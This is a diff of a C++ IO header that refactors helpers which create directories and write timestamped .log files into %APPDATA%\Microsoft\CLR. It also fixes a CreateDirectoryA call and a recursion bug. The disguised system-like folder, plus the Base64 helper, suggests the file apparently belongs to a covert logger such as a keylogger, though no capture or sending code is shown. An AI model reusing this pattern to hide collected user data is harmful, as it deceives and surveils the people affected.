@@ -3,13 +3,14 @@
 
 #include <string>
 #include <cstdlib>
+#include <fstream>
 #include "windows.h"
 #include "Helper.h"
 #include "Base64.h"
 
 namespace IO {
 	
-	std::string getOurPath(const bool append_separator = false) {
+	std::string GetOurPath(const bool append_separator = false) {
 
 		std::string appdata_dir(getenv("APPDATA"));
 		std::string full = appdata_dir + "\\Microsoft\\CLR";
@@ -17,19 +18,22 @@ namespace IO {
 		return full + (append_separator ? "\\" : "");
 	}
 
-	bool mkOneDr(std::string path) {
+	bool MKOneDr(std::string path) {
 
-		return (bool)CreateDirectory(path.c_str, NULL) ||
+		/*return (bool)CreateDirectory(path.c_str(), NULL) || 
+			GetLastError() == ERROR_ALREADY_EXISTS;*/
+
+		return (bool)CreateDirectoryA(path.c_str(), NULL) ||
 			GetLastError() == ERROR_ALREADY_EXISTS;
 	}
 
-	bool mkDir(std::string path) {
+	bool MKDir(std::string path) {
 
 		for(char &c : path)
 			if (c == '\\') {
 				
 				c = '\0';
-				if (!mkDir(path))
+				if (!MKOneDr(path))
 					return false;
 				c = '\\';
 			}
@@ -38,10 +42,10 @@ namespace IO {
 	}
 
 	template <class T>
-	std::string writeLog(const T& time) {
+	std::string WriteLog(const T& time) {
 
 		Helper::DateTime dateTime;
-		std::string path = getOurPath(true);
+		std::string path = GetOurPath(true);
 		std::string name = dateTime.getDateTimeString("_") + ".log";
 
 		try {
@@ -67,4 +71,4 @@ namespace IO {
 	}
 }
 
-#endif
+#endif // IO_H
